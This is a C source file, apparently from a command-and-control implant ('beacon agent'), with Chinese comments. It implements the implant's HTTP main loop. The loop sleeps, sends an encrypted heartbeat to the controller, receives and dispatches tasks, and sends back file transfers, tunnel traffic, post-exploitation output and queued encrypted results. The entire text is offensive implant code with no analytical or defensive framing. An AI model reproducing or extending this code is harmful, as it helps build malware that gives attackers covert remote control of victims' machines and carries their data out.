#include "beacon_agent_internal.h"

#if !defined(BEACON_EXTERNAL_TCP_BUILD)

/* HTTP transform 发送回调：把 encrypted result 与 heartbeat 一起送出，收回任务。 */
static INT HttpSendEncrypted(BeaconContext* ctx, VOID* ctx_sender,
                             const ByteBuf* encrypted, ByteBuf* response)
{
    const ByteBuf* heartbeat = (const ByteBuf*)ctx_sender;

    BbInit(response);
    if (!TransportHttpTransformExchange(&ctx->profile, heartbeat, encrypted, response)) {
        BbFree(response);
        return 0;
    }
    return 1;
}

/* HTTP external 主循环：新版 transform wire 协议。 */
INT AgentRunExternalHttp(Agent* agent)
{
    BeaconContext* ctx;

    if (!agent) return -1;
    ctx = &agent->ctx;

    while (ctx->active && InterlockedCompareExchange(&agent->stop, 0, 0) == 0) {
        ByteBuf plain;
        ByteBuf heartbeat;
        ByteBuf tasks;

        BeaconSleep(ctx);

        plain = AgentBuildHeartbeatPlain(ctx);
        if (!CryptoEncryptHeartbeat(ctx->profile.encrypt_key, &plain, &heartbeat)) {
            BbFree(&plain);
            continue;
        }
        BbFree(&plain);

        if (TransportHttpTransformExchange(&ctx->profile, &heartbeat, NULL, &tasks)) {
            AgentDispatchTasks(ctx, &tasks);
            AgentFlushTransfers(ctx);
            AgentFlushTunnels(ctx);
            AgentFlushCascade(ctx);
            AgentFlushPostEx(ctx);
            AgentFlushOutbox(ctx, HttpSendEncrypted, &heartbeat);
            BbFree(&tasks);
        }

        BbFree(&heartbeat);
    }

    return 0;
}

#endif
